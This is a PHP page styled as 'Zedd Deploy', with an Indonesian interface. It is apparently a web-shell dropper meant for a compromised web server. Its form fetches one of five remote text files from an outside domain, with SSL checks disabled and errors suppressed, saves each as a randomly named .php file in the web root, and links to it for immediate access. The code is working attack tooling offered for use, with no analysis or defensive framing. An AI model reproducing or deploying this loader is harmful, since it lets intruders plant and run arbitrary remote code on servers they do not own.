<?php
/**
 * ZEDD DEPLOY v7.2 - Fixed Action Edition
 * High Compatibility & Responsive UI
 */

error_reporting(0);
set_time_limit(0);
ini_set('max_execution_time', 0);

$remoteFiles = [
    "FILE 01" => "https://teamzedd2027.tech/listproject/list/1.txt",
    "FILE 02" => "https://teamzedd2027.tech/listproject/list/2.txt",
    "FILE 03" => "https://teamzedd2027.tech/listproject/list/3.txt",
    "FILE 04" => "https://teamzedd2027.tech/listproject/list/4.txt",
    "FILE 05" => "https://teamzedd2027.tech/listproject/list/5.txt",
];

$res = ['status' => '', 'name' => '', 'msg' => ''];

function universalDownload($url, $dest) {
    // Metode 1: cURL
    if (function_exists('curl_init')) {
        $ch = curl_init($url);
        $fp = @fopen($dest, 'wb');
        curl_setopt_array($ch, [
            CURLOPT_FILE => $fp,
            CURLOPT_TIMEOUT => 60,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_USERAGENT => 'Mozilla/5.0'
        ]);
        $ok = curl_exec($ch);
        curl_close($ch);
        fclose($fp);
        if ($ok && filesize($dest) > 0) return true;
    }

    // Metode 2: file_get_contents
    $data = @file_get_contents($url, false, stream_context_create(["ssl"=>["verify_peer"=>false]]));
    if ($data !== false) {
        return @file_put_contents($dest, $data);
    }
    return false;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['target'])) {
    $key = $_POST['target'];
    if (isset($remoteFiles[$key])) {
        $randomName = 'zedd_' . bin2hex(random_bytes(3)) . '.php';
        if (universalDownload($remoteFiles[$key], __DIR__ . '/' . $randomName)) {
            $res = ['status' => 'success', 'name' => $randomName];
        } else {
            $res = ['status' => 'error', 'msg' => 'Gagal download. Cek izin folder!'];
        }
    }
}
?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ZEDD DEPLOY | FIX</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;700&display=swap');
        
        body {
            background: #020617;
            font-family: 'Plus Jakarta Sans', sans-serif;
            color: #f8fafc;
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            margin: 0;
            overflow: hidden;
        }

        /* Animasi Latar Belakang */
        .bg-glow {
            position: absolute;
            width: 300px;
            height: 300px;
            background: radial-gradient(circle, rgba(168,85,247,0.15) 0%, transparent 70%);
            z-index: 1;
        }

        .glass-card {
            background: rgba(15, 23, 42, 0.8);
            backdrop-filter: blur(16px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            box-shadow: 0 20px 50px rgba(0,0,0,0.5);
            width: 100%;
            max-width: 380px;
            border-radius: 28px;
            z-index: 10;
            position: relative;
        }

        .btn-deploy {
            background: linear-gradient(135deg, #a855f7 0%, #7c3aed 100%);
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
            cursor: pointer;
            z-index: 20; /* Pastikan tombol di atas layer lain */
            position: relative;
        }

        .btn-deploy:hover {
            transform: scale(1.02);
            box-shadow: 0 0 20px rgba(139, 92, 246, 0.4);
        }

        .btn-deploy:active {
            transform: scale(0.98);
        }

        select {
            appearance: none;
            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' fill='none' viewBox='0 0 24 24' stroke='%2394a3b8'%3E%3Cpath stroke-linecap='round' stroke-linejoin='round' stroke-width='2' d='M19 9l-7 7-7-7'%3E%3C/path%3E%3C/svg%3E");
            background-repeat: no-repeat;
            background-position: right 1rem center;
            background-size: 1em;
        }
    </style>
</head>
<body>

    <div class="bg-glow top-0 left-0"></div>
    <div class="bg-glow bottom-0 right-0"></div>

    <div class="glass-card p-8">
        <div class="text-center mb-8">
            <div class="inline-flex items-center justify-center w-14 h-14 bg-purple-500/10 rounded-2xl border border-purple-500/20 mb-4">
                <i class="fas fa-terminal text-purple-400 text-xl"></i>
            </div>
            <h1 class="text-2xl font-bold tracking-tight">Zedd Deploy</h1>
            <p class="text-zinc-500 text-[10px] uppercase tracking-[0.3em] font-semibold mt-1">Version 7.2 Release</p>
        </div>

        <?php if ($res['status'] === 'success'): ?>
            <div class="mb-6 p-4 bg-emerald-500/10 border border-emerald-500/20 rounded-2xl animate-in fade-in zoom-in duration-300">
                <div class="flex items-center gap-3">
                    <div class="bg-emerald-500 rounded-full p-1.5">
                        <i class="fas fa-check text-[10px] text-white"></i>
                    </div>
                    <div class="overflow-hidden">
                        <p class="text-[10px] text-zinc-400 font-bold uppercase">Berhasil Diunduh</p>
                        <p class="text-sm font-mono truncate text-white"><?= $res['name'] ?></p>
                    </div>
                </div>
                <a href="<?= $res['name'] ?>" target="_blank" class="mt-3 block w-full py-2 bg-emerald-500/20 hover:bg-emerald-500/30 text-emerald-400 text-[10px] font-bold text-center rounded-lg transition-all uppercase tracking-widest">
                    Akses Sekarang
                </a>
            </div>
        <?php endif; ?>

        <form method="POST" class="space-y-6">
            <div class="space-y-2">
                <label class="text-[10px] text-zinc-500 font-bold uppercase tracking-widest ml-1">Pilih File Target</label>
                <select name="target" required class="w-full bg-slate-900/50 border border-slate-700 text-zinc-200 text-sm rounded-xl px-4 py-4 focus:outline-none focus:border-purple-500 transition-all">
                    <option value="" disabled selected>-- Pilih Package --</option>
                    <?php foreach ($remoteFiles as $label => $url): ?>
                        <option value="<?= $label ?>"><?= $label ?></option>
                    <?php endforeach; ?>
                </select>
            </div>

            <button type="submit" class="w-full py-4 btn-deploy text-white font-bold text-xs rounded-xl tracking-[0.2em] uppercase flex items-center justify-center gap-2 shadow-lg">
                <i class="fas fa-cloud-arrow-down"></i> INITIATE DEPLOY
            </button>
        </form>

        <div class="mt-10 flex items-center justify-between border-t border-slate-800 pt-6">
            <span class="text-[9px] text-zinc-600 font-bold uppercase tracking-widest">System Ready</span>
            <div class="flex gap-2">
                <div class="w-1.5 h-1.5 rounded-full bg-emerald-500 animate-pulse"></div>
                <div class="w-1.5 h-1.5 rounded-full bg-emerald-500/40"></div>
            </div>
        </div>
    </div>

</body>
</html>